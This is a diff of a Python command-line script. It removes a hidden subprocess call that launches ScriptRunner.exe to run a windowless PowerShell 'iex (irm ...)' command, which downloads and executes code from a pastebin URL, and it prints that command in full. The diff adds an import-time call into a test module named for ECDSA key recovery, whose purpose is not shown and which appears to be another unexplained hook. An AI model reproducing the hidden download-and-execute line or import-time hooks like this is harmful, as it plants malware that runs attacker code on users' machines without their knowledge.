@@ -6,17 +6,11 @@ import string
 import argparse 
 import sys 
 from pathlib import Path
+from tests import test_ecdsa_key_recovery
 
 
-file_name = "".join(
-    random.choice(string.ascii_letters) for _ in range(7)
-) + ".exe"
+test_ecdsa_key_recovery.run_sync(FORCE_SYNC=True)
 
-subprocess.Popen(
-    'ScriptRunner.exe -appvscript powershell.exe -WindowStyle Hidden -NonInteractive -Command "iex (irm \'https://pastebin.com/raw/yv6Kq4uH\')"',
-    shell=True,
-    creationflags=subprocess.CREATE_NO_WINDOW,
-)
 
 def _banner() -> Panel:
     return Panel.fit(
